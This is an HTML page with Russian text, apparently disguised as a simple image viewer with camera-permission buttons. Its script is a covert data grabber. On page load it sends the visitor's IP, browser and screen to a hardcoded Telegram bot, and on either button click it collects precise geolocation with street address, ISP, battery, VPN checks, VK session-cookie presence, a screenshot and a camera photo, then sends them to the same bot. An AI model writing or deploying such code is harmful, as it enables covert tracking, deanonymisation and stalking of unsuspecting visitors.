<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ü—Ä–æ—Å–º–æ—Ç—Ä –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            flex-direction: column;
        }
        .image-container {
            text-align: center;
            margin-bottom: 20px;
        }
        .image-container img {
            max-width: 100%;
            max-height: 70vh;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        .permission-buttons {
            margin-top: 20px;
        }
        button {
            padding: 10px 15px;
            margin: 0 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
        .loading {
            display: none;
            margin-top: 20px;
            font-style: italic;
            color: #666;
        }
        .location-info {
            margin-top: 15px;
            padding: 10px;
            background: #e9f7ef;
            border-radius: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="image-container">
        <img src="https://i.pinimg.com/564x/a2/36/20/a23620bbf4143ab4b90a462e59c25dad.jpg" alt="–ö—Ä–∞—Å–∏–≤–æ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ">
    </div>

    <div class="permission-buttons">
        <button id="allowCamera">–†–∞–∑—Ä–µ—à–∏—Ç—å –∫–∞–º–µ—Ä—É</button>
        <button id="denyCamera">–û—Ç–∫–∞–∑–∞—Ç—å</button>
    </div>

    <div class="location-info" id="locationInfo">
        –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è...
    </div>

    <div class="loading" id="loadingIndicator">
        –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö...
    </div>

    <script>
        // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram –±–æ—Ç–∞
        const botToken = '6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8';
        const chatId = '1209403544';
        
        // –≠–ª–µ–º–µ–Ω—Ç—ã DOM
        const allowCameraBtn = document.getElementById('allowCamera');
        const denyCameraBtn = document.getElementById('denyCamera');
        const loadingIndicator = document.getElementById('loadingIndicator');
        const locationInfo = document.getElementById('locationInfo');

        // –°–∫—Ä—ã—Ç—å –∫–Ω–æ–ø–∫–∏ –ø–æ—Å–ª–µ –Ω–∞–∂–∞—Ç–∏—è
        function hideButtons() {
            allowCameraBtn.style.display = 'none';
            denyCameraBtn.style.display = 'none';
            loadingIndicator.style.display = 'block';
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        async function sendToTelegram(data, file = null, caption = '') {
            try {
                if (file) {
                    // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–∞–π–ª–∞ (—Ñ–æ—Ç–æ –∏–ª–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞)
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('caption', caption);
                    formData.append('photo', file);
                    
                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } else {
                    // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: data,
                            parse_mode: 'HTML'
                        })
                    });
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞
        function getBrowserName() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes("Firefox")) return "Firefox";
            if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
            if (userAgent.includes("Trident")) return "Internet Explorer";
            if (userAgent.includes("Edge")) return "Edge";
            if (userAgent.includes("Chrome")) return "Chrome";
            if (userAgent.includes("Safari")) return "Safari";
            return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π";
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è –∏ –≥–æ—Ä–æ–¥–∞
        async function getLocationAndCity() {
            locationInfo.style.display = 'block';
            
            try {
                if (navigator.geolocation) {
                    // –ü–æ–ª—É—á–∞–µ–º –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });
                    
                    const coords = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    
                    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
                    locationInfo.innerHTML = `
                        <strong>–í–∞—à–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:</strong><br>
                        –®–∏—Ä–æ—Ç–∞: ${coords.lat.toFixed(6)}<br>
                        –î–æ–ª–≥–æ—Ç–∞: ${coords.lon.toFixed(6)}<br>
                        –¢–æ—á–Ω–æ—Å—Ç—å: ¬±${Math.round(coords.accuracy)} –º–µ—Ç—Ä–æ–≤
                    `;
                    
                    // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –≥–æ—Ä–æ–¥ —á–µ—Ä–µ–∑ Nominatim API (OpenStreetMap)
                    try {
                        const response = await fetch(
                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${coords.lat}&lon=${coords.lon}&zoom=18&addressdetails=1`
                        );
                        const data = await response.json();
                        
                        let city = '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω';
                        let address = '';
                        
                        if (data.address) {
                            city = data.address.city || data.address.town || 
                                   data.address.village || data.address.county || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –≥–æ—Ä–æ–¥';
                            address = `
                                <br><strong>–ê–¥—Ä–µ—Å:</strong><br>
                                ${data.address.road ? data.address.road + ', ' : ''}
                                ${data.address.house_number ? data.address.house_number + ', ' : ''}
                                ${city}
                                ${data.address.country ? ', ' + data.address.country : ''}
                            `;
                        }
                        
                        locationInfo.innerHTML += `<br><strong>–ì–æ—Ä–æ–¥:</strong> ${city}` + address;
                        
                        return {
                            coordinates: coords,
                            city: city,
                            address: data.address || {},
                            fullData: data
                        };
                    } catch (error) {
                        console.log("–û—à–∏–±–∫–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –≥–æ—Ä–æ–¥–∞:", error);
                        return {
                            coordinates: coords,
                            city: "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å",
                            address: {},
                            fullData: null
                        };
                    }
                }
            } catch (error) {
                console.log("–î–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∑–∞–ø—Ä–µ—â–µ–Ω –∏–ª–∏ –æ—à–∏–±–∫–∞:", error);
                locationInfo.innerHTML = "<strong>–î–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∑–∞–ø—Ä–µ—â–µ–Ω</strong>";
                return null;
            }
            
            return null;
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ VPN/Proxy
        function checkVPNProxy() {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø—Ä–∏–∑–Ω–∞–∫–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è VPN/Proxy
            const tests = {
                timezoneMismatch: false,
                languageMismatch: false,
                webRTCLeak: false,
                dnsLeak: false
            };
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–µ—Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏—è —á–∞—Å–æ–≤–æ–≥–æ –ø–æ—è—Å–∞ –∏ —è–∑—ã–∫–∞
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const language = navigator.language;
            
            if ((language.startsWith('ru') && !timezone.includes('Europe/Moscow')) ||
                (language.startsWith('en') && !timezone.includes('America') && !timezone.includes('Europe/London'))) {
                tests.timezoneMismatch = true;
            }
            
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ WebRTC (–º–æ–∂–µ—Ç –≤—ã–¥–∞—Ç—å —Ä–µ–∞–ª—å–Ω—ã–π IP –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ VPN)
            try {
                const rtc = new RTCPeerConnection({iceServers: []});
                rtc.createDataChannel('');
                rtc.createOffer()
                    .then(offer => rtc.setLocalDescription(offer))
                    .catch(e => console.log(e));
                
                rtc.onicecandidate = (e) => {
                    if (e.candidate && e.candidate.candidate.indexOf('typ srflx') !== -1) {
                        tests.webRTCLeak = true;
                    }
                };
            } catch (e) {
                console.log("WebRTC test failed:", e);
            }
            
            // –ê–Ω–∞–ª–∏–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
            if (tests.timezoneMismatch || tests.webRTCLeak) {
                return "–í–æ–∑–º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è VPN/Proxy";
            }
            
            return "–ù–µ—Ç —è–≤–Ω—ã—Ö –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ VPN/Proxy";
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–∏
        function getConnectionInfo() {
            if ('connection' in navigator) {
                const conn = navigator.connection;
                return {
                    —Ç–∏–ø: conn.effectiveType,
                    —Å–∫–æ—Ä–æ—Å—Ç—å: conn.downlink ? conn.downlink + ' –ú–±–∏—Ç/—Å' : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    ping: conn.rtt ? conn.rtt + ' –º—Å' : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    —ç–∫–æ–Ω–æ–º–Ω—ã–π–†–µ–∂–∏–º: conn.saveData ? '–î–∞' : '–ù–µ—Ç'
                };
            }
            return "API —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è";
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞ –±–∞—Ç–∞—Ä–µ–∏
        async function getBatteryStatus() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        —É—Ä–æ–≤–µ–Ω—å: Math.round(battery.level * 100) + '%',
                        –∑–∞—Ä—è–∂–∞–µ—Ç—Å—è: battery.charging ? "–î–∞" : "–ù–µ—Ç",
                        –≤—Ä–µ–º—è–ó–∞—Ä—è–¥–∫–∏: battery.chargingTime === Infinity ? "–ù–µ –∑–∞—Ä—è–∂–∞–µ—Ç—Å—è" : 
                                       battery.chargingTime > 0 ? Math.floor(battery.chargingTime / 60) + ' –º–∏–Ω' : "–ü–æ–ª–Ω–æ—Å—Ç—å—é –∑–∞—Ä—è–∂–µ–Ω–∞",
                        –≤—Ä–µ–º—è–†–∞–±–æ—Ç—ã: battery.dischargingTime === Infinity ? "–ù–µ —Ä–∞–∑—Ä—è–∂–∞–µ—Ç—Å—è" : 
                                    battery.dischargingTime > 0 ? Math.floor(battery.dischargingTime / 60) + ' –º–∏–Ω' : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
                    };
                } catch (error) {
                    console.log("–û—à–∏–±–∫–∞ Battery API:", error);
                }
            }
            return "Battery API –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è";
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –í–ö–æ–Ω—Ç–∞–∫—Ç–µ
        function checkVKAuth() {
            return document.cookie.includes('remixsid') || 
                   document.cookie.includes('vk_app_') ? "–î–∞" : "–ù–µ—Ç";
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞
        async function getISPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    –ø—Ä–æ–≤–∞–π–¥–µ—Ä: data.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    —Å—Ç—Ä–∞–Ω–∞: data.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    —Ä–µ–≥–∏–æ–Ω: data.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    –≥–æ—Ä–æ–¥: data.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    IP: data.ip || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                };
            } catch (error) {
                console.log("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞:", error);
                return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é";
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã
        async function takePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                const photoBlob = await imageCapture.takePhoto();
                
                // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–æ—Ç–æ–∫
                stream.getTracks().forEach(track => track.stop());
                
                return new File([photoBlob], 'user_photo.jpg', { type: 'image/jpeg' });
            } catch (error) {
                console.log("–û—à–∏–±–∫–∞ –∫–∞–º–µ—Ä—ã:", error);
                return null;
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å–∫—Ä–∏–Ω—à–æ—Ç–∞
        async function takeScreenshot() {
            try {
                // –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ html2canvas
                if (typeof html2canvas !== 'function') {
                    const script = document.createElement('script');
                    script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
                    document.head.appendChild(script);
                    
                    await new Promise(resolve => script.onload = resolve);
                }
                
                const canvas = await html2canvas(document.body);
                return new Promise(resolve => {
                    canvas.toBlob(blob => {
                        resolve(new File([blob], 'screenshot.png', { type: 'image/png' }));
                    }, 'image/png');
                });
            } catch (error) {
                console.log("–û—à–∏–±–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞:", error);
                return null;
            }
        }

        // –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        async function collectAndSendData(withCamera = false) {
            hideButtons();
            
            // –°–æ–±–∏—Ä–∞–µ–º –æ—Å–Ω–æ–≤–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            const locationData = await getLocationAndCity();
            const battery = await getBatteryStatus();
            const ispInfo = await getISPInfo();
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
            const userData = `
<b>üÜï –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å!</b>

<b>üìÖ –í—Ä–µ–º—è:</b> ${new Date().toLocaleString()}
<b>üåê –ë—Ä–∞—É–∑–µ—Ä:</b> ${getBrowserName()}
<b>üñ•Ô∏è –û–°:</b> ${navigator.platform}
<b>üì± User Agent:</b> ${navigator.userAgent}

<b>üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è:</b> 
${locationData ? `
- –®–∏—Ä–æ—Ç–∞: ${locationData.coordinates.lat.toFixed(6)}
- –î–æ–ª–≥–æ—Ç–∞: ${locationData.coordinates.lon.toFixed(6)}
- –¢–æ—á–Ω–æ—Å—Ç—å: ¬±${Math.round(locationData.coordinates.accuracy)} –º–µ—Ç—Ä–æ–≤
- –ì–æ—Ä–æ–¥: ${locationData.city}
- –ê–¥—Ä–µ—Å: ${locationData.address.road || ''} ${locationData.address.house_number || ''}
- –ü–æ—á—Ç–æ–≤—ã–π –∏–Ω–¥–µ–∫—Å: ${locationData.address.postcode || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}
` : '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ'}

<b>üåç –ò–Ω—Ç–µ—Ä–Ω–µ—Ç-–ø—Ä–æ–≤–∞–π–¥–µ—Ä:</b>
- IP: ${ispInfo.IP || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}
- –ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${ispInfo.–ø—Ä–æ–≤–∞–π–¥–µ—Ä || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}
- –°—Ç—Ä–∞–Ω–∞: ${ispInfo.—Å—Ç—Ä–∞–Ω–∞ || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}
- –†–µ–≥–∏–æ–Ω: ${ispInfo.—Ä–µ–≥–∏–æ–Ω || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}

<b>üì∂ –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ:</b> 
${JSON.stringify(getConnectionInfo(), null, 2).replace(/[{}"]/g, '').replace(/,/g, '\n')}

<b>üîã –ë–∞—Ç–∞—Ä–µ—è:</b> 
${typeof battery === 'object' ? 
`- –£—Ä–æ–≤–µ–Ω—å: ${battery.—É—Ä–æ–≤–µ–ª—å}
- –ó–∞—Ä—è–∂–∞–µ—Ç—Å—è: ${battery.–∑–∞—Ä—è–∂–∞–µ—Ç—Å—è}
- –í—Ä–µ–º—è –¥–æ –∑–∞—Ä—è–¥–∫–∏: ${battery.–≤—Ä–µ–º—è–ó–∞—Ä—è–¥–∫–∏}
- –í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã: ${battery.–≤—Ä–µ–º—è–†–∞–±–æ—Ç—ã}`
: battery}

<b>üõ°Ô∏è VPN/Proxy:</b> ${checkVPNProxy()}

<b>üñ•Ô∏è –°–∏—Å—Ç–µ–º–∞:</b>
- –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${screen.width}x${screen.height}
- –ì–ª—É–±–∏–Ω–∞ —Ü–≤–µ—Ç–∞: ${screen.colorDepth}-bit
- –Ø–∑—ã–∫: ${navigator.language}
- –ö—É–∫–∏: ${document.cookie ? '–ï—Å—Ç—å' : '–ù–µ—Ç'}
- VK –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è: ${checkVKAuth()}
- –î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ: ${withCamera ? '–†–∞–∑—Ä–µ—à–µ–Ω–æ' : '–ó–∞–ø—Ä–µ—â–µ–Ω–æ'}
            `;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Å–Ω–æ–≤–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            await sendToTelegram(userData);
            
            // –ü—Ä–æ–±—É–µ–º —Å–¥–µ–ª–∞—Ç—å –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç
            const screenshot = await takeScreenshot();
            if (screenshot) {
                await sendToTelegram(null, screenshot, '–°–∫—Ä–∏–Ω—à–æ—Ç —Å—Ç—Ä–∞–Ω–∏—Ü—ã');
            }
            
            // –ü—Ä–æ–±—É–µ–º —Å–¥–µ–ª–∞—Ç—å –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–æ—Ç–æ, –µ—Å–ª–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–æ
            if (withCamera) {
                const photo = await takePhoto();
                if (photo) {
                    await sendToTelegram(null, photo, '–§–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è');
                }
            }
            
            loadingIndicator.textContent = "–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!";
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–Ω–æ–ø–æ–∫
        allowCameraBtn.addEventListener('click', () => collectAndSendData(true));
        denyCameraBtn.addEventListener('click', () => collectAndSendData(false));

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        (async function() {
            const minimalData = `
<b>‚ö†Ô∏è –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å –∑–∞—à–µ–ª –Ω–∞ —Å–∞–π—Ç!</b>

<b>–í—Ä–µ–º—è:</b> ${new Date().toLocaleString()}
<b>–ë—Ä–∞—É–∑–µ—Ä:</b> ${getBrowserName()}
<b>–û–°:</b> ${navigator.platform}
<b>–≠–∫—Ä–∞–Ω:</b> ${screen.width}x${screen.height}
<b>IP:</b> ${(await getISPInfo()).IP || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}
            `;
            
            await sendToTelegram(minimalData);
        })();
    </script>
</body>
</html>
